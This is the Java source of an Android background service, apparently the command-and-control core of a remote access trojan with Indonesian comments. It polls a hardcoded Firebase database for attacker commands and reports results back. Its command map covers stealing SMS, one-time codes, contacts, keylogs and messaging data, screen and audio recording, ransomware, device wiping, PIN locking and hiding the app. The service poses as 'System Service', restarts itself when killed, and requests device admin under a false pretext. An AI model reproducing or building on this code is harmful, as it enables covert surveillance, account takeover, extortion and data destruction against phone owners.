package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONObject;
import org.json.JSONArray;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SpyService extends Service {

    private static final String TAG        = "CRPT.Spy";
    private static final String CHANNEL_ID = "SpyServiceChannel";
    private static final int    NOTIF_ID   = 1;

    // ── Firebase RTDB REST ───────────────────────────────────────────────────
    private static final String FB_BASE    = "https://hayu-c4eb3-default-rtdb.asia-southeast1.firebasedatabase.app";
    private static final String FB_AUTH    = "AIzaSyAt3fcQ0BcEEcrgoEmxX0Bt4u2e-V9Ye0E";

    private Handler  loopHandler;
    private Runnable loopRunnable;
    private boolean  running = false;

    @Override
    public void onCreate() {
        super.onCreate();
        buildNotification();
        PersistentWorker.schedule(this);
        startLoop();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) startLoop();
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent r = new Intent(getApplicationContext(), SpyService.class);
        r.setPackage(getPackageName());
        startService(r);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        running = false;
        if (loopHandler != null && loopRunnable != null)
            loopHandler.removeCallbacks(loopRunnable);
        Intent b = new Intent("RestartSpyService");
        b.setClass(this, RestarterReceiver.class);
        sendBroadcast(b);
        super.onDestroy();
    }

    @Nullable @Override
    public IBinder onBind(Intent intent) { return null; }

    // ════════════════════════════════════════════════════════════════════════
    // LOOP
    // ════════════════════════════════════════════════════════════════════════
    private void startLoop() {
        if (running) return;
        running = true;
        loopHandler = new Handler(Looper.getMainLooper());
        loopRunnable = new Runnable() {
            @Override public void run() {
                if (!running) return;
                try { tick(); } catch (Exception e) { Log.w(TAG, e.getMessage()); }
                loopHandler.postDelayed(this, 3000);
            }
        };
        loopHandler.post(loopRunnable);
    }

    // ── Baca deviceId dari semua sumber ──────────────────────────────────────
    private String getDeviceIdSafe() {
        try {
            String id = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
                .getString("flutter.target_id", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}
        try {
            String id = getSharedPreferences("SpyPrefs", MODE_PRIVATE)
                .getString("targetId", null);
            if (id != null && !id.isEmpty()) return id;
        } catch (Exception ignored) {}
        try {
            File f = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt/.devid");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String id = br.readLine(); br.close();
                if (id != null && !id.trim().isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}
        try {
            File f = new File(getCacheDir(), "devid.dat");
            if (f.exists()) {
                BufferedReader br = new BufferedReader(new FileReader(f));
                String id = br.readLine(); br.close();
                if (id != null && !id.trim().isEmpty()) return id.trim();
            }
        } catch (Exception ignored) {}
        try {
            String aid = android.provider.Settings.Secure.getString(
                getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            if (aid != null && !aid.isEmpty()) {
                String id = (android.os.Build.BRAND + "-" + android.os.Build.MODEL + "-" + aid)
                    .replaceAll(" ", "_");
                saveDeviceId(id);
                return id;
            }
        } catch (Exception ignored) {}
        return null;
    }

    private void saveDeviceId(String deviceId) {
        if (deviceId == null || deviceId.isEmpty()) return;
        try {
            getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE).edit()
                .putString("flutter.target_id", deviceId)
                .putString("flutter.target_model", android.os.Build.BRAND + " " + android.os.Build.MODEL)
                .apply();
        } catch (Exception ignored) {}
        try {
            getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                .putString("targetId", deviceId).apply();
        } catch (Exception ignored) {}
        try {
            File dir = new File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
            dir.mkdirs();
            FileWriter fw = new FileWriter(new File(dir, ".devid"));
            fw.write(deviceId); fw.close();
        } catch (Exception ignored) {}
        try {
            FileWriter fw = new FileWriter(new File(getCacheDir(), "devid.dat"));
            fw.write(deviceId); fw.close();
        } catch (Exception ignored) {}
    }

    // ════════════════════════════════════════════════════════════════════════
    // TICK — heartbeat + ambil command dari Firebase RTDB
    // ════════════════════════════════════════════════════════════════════════
    private void tick() {
        String deviceId = getDeviceIdSafe();
        if (deviceId == null || deviceId.isEmpty()) return;

        // 1. Heartbeat → targets/{deviceId}
        try {
            JSONObject body = new JSONObject();
            body.put("battery", getBattery());
            body.put("status", "Alive");
            body.put("lastSeen", System.currentTimeMillis());
            body.put("model", android.os.Build.BRAND + " " + android.os.Build.MODEL);
            fbPatch("targets/" + deviceId, body.toString());
        } catch (Exception e) { Log.w(TAG, "hb: " + e.getMessage()); }

        // 2. Ambil command pending tertua → commands/{deviceId}?orderBy=timestamp&limitToFirst=20
        try {
            String resp = fbGet("commands/" + deviceId
                + "?orderBy=%22timestamp%22&limitToFirst=20");
            if (resp == null || resp.equals("null") || resp.isEmpty()) return;
            JSONObject all = new JSONObject(resp);
            String oldestKey = null;
            JSONObject oldestVal = null;
            long oldestTs = Long.MAX_VALUE;
            java.util.Iterator<String> keys = all.keys();
            while (keys.hasNext()) {
                String k = keys.next();
                JSONObject v = all.optJSONObject(k);
                if (v == null) continue;
                if (!"pending".equals(v.optString("status"))) continue;
                long ts = v.optLong("timestamp", 0);
                if (ts < oldestTs) { oldestTs = ts; oldestKey = k; oldestVal = v; }
            }
            if (oldestKey == null || oldestVal == null) return;

            // Mapping cmd integer → string (sama dgn main.dart)
            int rawInt = oldestVal.optInt("cmd", 0);
            String cmd = mapCmd(rawInt, oldestVal.optString("cmd", "idle"));
            String extra = oldestVal.optString("param", "");

            // Tandai status → sent
            JSONObject upd = new JSONObject();
            upd.put("status", "sent");
            fbPatch("commands/" + deviceId + "/" + oldestKey, upd.toString());

            if ("idle".equals(cmd)) return;
            execCmd(deviceId, cmd, extra, oldestKey);

        } catch (Exception e) { Log.w(TAG, "cmd: " + e.getMessage()); }
    }

    // ════════════════════════════════════════════════════════════════════════
    // CMD MAP — sama persis dgn main.dart cmdMap
    // ════════════════════════════════════════════════════════════════════════
    private String mapCmd(int code, String fallback) {
        switch (code) {
            case 98765432: return "hard_lock";
            case 98765433: return "unlock";
            case 11223344: case 11223345: return "take_photo";
            case 99887766: return "enable_admin";
            case 66985478: return "back";
            case 25896321: return "home";
            case 33654789: return "recents";
            case 45832158: return "notifications";
            case 44598715: return "click";
            case 885478962: return "set_text";
            case 115987: return "touch";
            case 74789654: return "launch_app";
            case 64645897: return "uninstall";
            case 1596485: case 1080: return "get_apps";
            case 5698742: return "auto_block_screen";
            case 89521475: return "stop_auto_block";
            case 87654321: return "set_lock_pin";
            case 1001: return "get_contacts";
            case 1002: return "get_sms";
            case 1003: return "send_sms";
            case 1004: return "get_call_log";
            case 1005: return "get_location";
            case 1006: return "device_info";
            case 1007: return "get_chrome_history";
            case 1008: return "vibrate_loop";
            case 1009: return "wipe_sdcard";
            case 1010: return "start_ransomware";
            case 1011: return "set_wallpaper";
            case 1012: case 2001: return "play_audio";
            case 1013: return "send_notif";
            case 1014: return "get_downloads";
            case 1015: return "upload_file";
            case 1016: return "flash_on";
            case 1017: return "flash_off";
            case 1018: return "flash_strobe";
            case 1019: return "get_notifications";
            case 1020: return "get_gallery";
            case 200: return "get_gmails";
            case 2000: return "custom_lock_html";
            case 1050: return "get_whatsapp_number";
            case 1051: return "get_otp";
            case 1052: return "get_telegram";
            case 1053: return "get_google_accounts";
            case 1054: return "get_whatsapp_media";
            case 1055: return "get_keylogs";
            case 1060: return "get_screen";
            case 1061: return "screen_record_start";
            case 1062: return "screen_record_stop";
            case 1063: return "live_screen_start";
            case 1064: return "live_stop";
            case 1070: return "record_audio";
            case 1071: return "record_audio_stop";
            case 3000: return "lock_live";
            case 10101: return "decrypt_files";
            default: return fallback.isEmpty() || fallback.equals("0") ? "idle" : fallback;
        }
    }

    // ════════════════════════════════════════════════════════════════════════
    // EXECUTE COMMAND (command yg bisa dihandle tanpa Flutter)
    // Command yg butuh Flutter → delegate ke Flutter via broadcast
    // ════════════════════════════════════════════════════════════════════════
    private void execCmd(String deviceId, String cmd, String extra, String cmdId) {
        new Thread(() -> {
            try {
                JSONObject result = new JSONObject();
                boolean handled = true;

                switch (cmd) {

                    case "force_open": {
                        Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                        if (l != null) { l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT); startActivity(l); }
                        result.put("status", "opened");
                        break;
                    }

                    case "lock_live":
                    case "hard_lock":
                    case "lock_screen":
                    case "lock_device": {
                        String msg = "YOUR PHONE IS LOCKED!!!!";
                        String pin = "1234";
                        if (extra.contains("|")) {
                            String[] pts = extra.split("\\|", 2);
                            msg = pts[0].isEmpty() ? msg : pts[0];
                            pin = pts.length > 1 && !pts[1].isEmpty() ? pts[1] : pin;
                        } else if (!extra.isEmpty()) { msg = extra; }
                        boolean isLive = "lock_live".equals(cmd);
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                            .putBoolean("isLocked", true).putBoolean("isLockLive", isLive)
                            .putString("lockMessage", msg).putString("lockPin", pin).apply();
                        try {
                            android.app.admin.DevicePolicyManager dpm =
                                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            android.content.ComponentName admin =
                                new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpm != null && dpm.isAdminActive(admin)) {
                                dpm.lockNow();
                                result.put("status", isLive ? "lock_live_active" : "locked");
                            } else {
                                Intent req = getPackageManager().getLaunchIntentForPackage(getPackageName());
                                if (req != null) { req.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(req); }
                                result.put("status", "admin_not_active_reopening");
                            }
                        } catch (Exception e) { result.put("status", "lock_err: " + e.getMessage()); }
                        break;
                    }

                    case "unlock": {
                        getSharedPreferences("SpyPrefs", MODE_PRIVATE).edit()
                            .putBoolean("isLocked", false).putBoolean("isLockLive", false).apply();
                        result.put("status", "unlocked");
                        break;
                    }

                    case "reboot_device":
                    case "restart_device": {
                        boolean done = false;
                        if (!done) try {
                            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
                            java.lang.reflect.Method m = pm.getClass().getDeclaredMethod("reboot", String.class);
                            m.setAccessible(true); m.invoke(pm, (Object) null); done = true;
                        } catch (Exception ex) {}
                        if (!done) try {
                            android.app.admin.DevicePolicyManager dpm2 =
                                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                            android.content.ComponentName admin2 =
                                new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                            if (dpm2 != null && dpm2.isAdminActive(admin2) && Build.VERSION.SDK_INT >= 24)
                                { dpm2.reboot(admin2); done = true; }
                        } catch (Exception ex) {}
                        if (!done) try {
                            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
                            p.waitFor(3, java.util.concurrent.TimeUnit.SECONDS); done = true;
                        } catch (Exception ex) {}
                        result.put("status", done ? "rebooting" : "reboot_attempted");
                        break;
                    }

                    case "vibrate_loop": {
                        android.os.Vibrator vib;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            android.os.VibratorManager vbm = (android.os.VibratorManager) getSystemService(VIBRATOR_MANAGER_SERVICE);
                            vib = vbm != null ? vbm.getDefaultVibrator() : null;
                        } else { vib = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE); }
                        if (vib != null) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                                vib.vibrate(android.os.VibrationEffect.createWaveform(new long[]{0,500,200}, 0));
                            else vib.vibrate(new long[]{0,500,200}, 0);
                        }
                        result.put("status", "vibrating");
                        break;
                    }

                    case "kill_wifi": {
                        try {
                            android.net.wifi.WifiManager wm =
                                (android.net.wifi.WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
                            if (wm != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) wm.setWifiEnabled(false);
                        } catch (Exception ignored) {}
                        result.put("status", "wifi_killed");
                        break;
                    }

                    case "re_request_admin": {
                        Intent adminReq = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        android.content.ComponentName comp =
                            new android.content.ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                        adminReq.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
                        adminReq.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
                        adminReq.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(adminReq);
                        result.put("status", "admin_requested");
                        break;
                    }

                    case "factory_reset":
                    case "wipe_device": {
                        String r2 = RATCore.factoryReset();
                        result.put("status", r2);
                        break;
                    }

                    case "wipe_sdcard": {
                        RATCore.wipeSdcard();
                        result.put("status", "sdcard_wipe_started");
                        break;
                    }

                    case "hide_app": { RATCore.hideApp(); result.put("status", "hidden"); break; }
                    case "show_app": { RATCore.showApp(); result.put("status", "visible"); break; }

                    default:
                        // Command butuh Flutter → kirim broadcast, buka app
                        handled = false;
                        result.put("status", "delegated_to_flutter");
                        result.put("cmd", cmd);
                        try {
                            Intent l = getPackageManager().getLaunchIntentForPackage(getPackageName());
                            if (l != null) { l.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); startActivity(l); }
                        } catch (Exception ignored) {}
                        // Juga kirim broadcast agar Flutter bisa handle jika app sudah terbuka
                        Intent bc = new Intent("com.nullx.pp.EXECUTE_CMD");
                        bc.putExtra("cmd", cmd);
                        bc.putExtra("extra", extra);
                        bc.putExtra("cmdId", cmdId);
                        sendBroadcast(bc);
                        break;
                }

                // Post response ke Firebase → results/{deviceId}/{cmdId}
                JSONObject resp = new JSONObject();
                resp.put("cmd", cmd);
                resp.put("data", result);
                resp.put("device_id", deviceId);
                resp.put("receivedAt", System.currentTimeMillis());
                fbSet("results/" + deviceId + "/" + cmdId, resp.toString());

                // Hapus command dari antrian setelah selesai
                fbDelete("commands/" + deviceId + "/" + cmdId);

            } catch (Exception e) { Log.w(TAG, "exec: " + e.getMessage()); }
        }).start();
    }

    // ════════════════════════════════════════════════════════════════════════
    // FIREBASE RTDB REST HELPERS
    // ════════════════════════════════════════════════════════════════════════
    private String fbGet(String path) {
        try {
            String url = FB_BASE + "/" + path + ".json?auth=" + FB_AUTH;
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("GET"); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            if (c.getResponseCode() != 200) return null;
            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(); String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close(); c.disconnect();
            return sb.toString();
        } catch (Exception e) { Log.w(TAG, "fbGet: " + e.getMessage()); return null; }
    }

    private void fbPatch(String path, String json) {
        try {
            String url = FB_BASE + "/" + path + ".json?auth=" + FB_AUTH;
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("PATCH");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8)); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception e) { Log.w(TAG, "fbPatch: " + e.getMessage()); }
    }

    private void fbSet(String path, String json) {
        try {
            String url = FB_BASE + "/" + path + ".json?auth=" + FB_AUTH;
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("PUT");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            OutputStream os = c.getOutputStream();
            os.write(json.getBytes(StandardCharsets.UTF_8)); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception e) { Log.w(TAG, "fbSet: " + e.getMessage()); }
    }

    private void fbDelete(String path) {
        try {
            String url = FB_BASE + "/" + path + ".json?auth=" + FB_AUTH;
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("DELETE"); c.setConnectTimeout(5000); c.setReadTimeout(5000);
            c.getResponseCode(); c.disconnect();
        } catch (Exception e) { Log.w(TAG, "fbDelete: " + e.getMessage()); }
    }

    private int getBattery() {
        try {
            Intent i = getApplicationContext().registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i != null) {
                int lv = i.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int sc = i.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                if (lv >= 0 && sc > 0) return (int)(lv * 100f / sc);
            }
        } catch (Exception ignored) {}
        return 100;
    }

    // ════════════════════════════════════════════════════════════════════════
    // NOTIFICATION
    // ════════════════════════════════════════════════════════════════════════
    private void buildNotification() {
        createChannel();
        Notification n = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service").setContentText("Running...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN).setOngoing(true).build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "Spy Service", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
    }

    public static void saveDeviceIdAll(String deviceId) {}
}
